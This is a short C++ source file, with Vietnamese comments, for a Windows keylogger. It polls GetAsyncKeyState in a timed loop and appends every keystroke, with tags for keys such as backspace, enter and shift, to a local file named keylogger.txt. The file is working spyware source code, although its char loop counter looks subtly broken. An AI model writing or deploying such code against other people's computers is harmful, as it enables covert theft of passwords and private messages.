#include "keylogger.h"
using namespace std;

void writeToLog(string s) {
    std::ofstream logFile;
    logFile.open("keylogger.txt", std::ios::app);
    if (logFile.is_open()) {
        logFile << s;
    }
    logFile.close();
}

bool isKeyLoggingTimeExpired(time_t startTime, int durationInSeconds) {
    time_t currentTime = time(NULL);
    return difftime(currentTime, startTime) >= durationInSeconds;
}

void keylogger(int durationInSeconds) {
    std::ofstream logFile;
    logFile.open("keylogger.txt", std::ios:: out);
    // if (!logFile.is_open()) 
    //     std::cout << "Can not open logFile." << std::endl;
    logFile.close();
    time_t startTime = time(NULL);
    while (!isKeyLoggingTimeExpired(startTime, durationInSeconds)) {
        for (char key = 8; key <= 254; key++) {
            if (GetAsyncKeyState(key) & 0x0001) {
                if (key == VK_BACK)
                    writeToLog("[backspace]");
                else if (key == VK_RETURN)
                    writeToLog("[enter]");
                else if (key == VK_SHIFT)
                    writeToLog("[shift]");
                else if (key == VK_CONTROL)
                    writeToLog("[control]");
                else if (key == VK_CAPITAL)
                    writeToLog("[cap]");
                else if (key == VK_TAB)
                    writeToLog("[tab]");
                else if (key == VK_MENU)
                    writeToLog("[alt]");
                else if (key == VK_SPACE)
                    writeToLog("[space]");
                else if (key == VK_LBUTTON || key == VK_RBUTTON)
                    break;
                else
                {
                    char convert = char(key);
                    writeToLog(string(1, convert));
                }
            }
        }
        Sleep(10); // Giảm tải cho CPU
    }
}

// int main() {
//     int durationInSeconds;

//     std::cout << "Nhap thoi gian keylogger chay (giay): ";
//     std::cin >> durationInSeconds;

//     std::cout << "Bat dau ghi lai phim bam trong " << durationInSeconds << " giay..." << std::endl;
//     keylogger(durationInSeconds);

//     std::cout << "Hoan tat viec ghi lai phim bam." << std::endl;

//     return 0;
// }


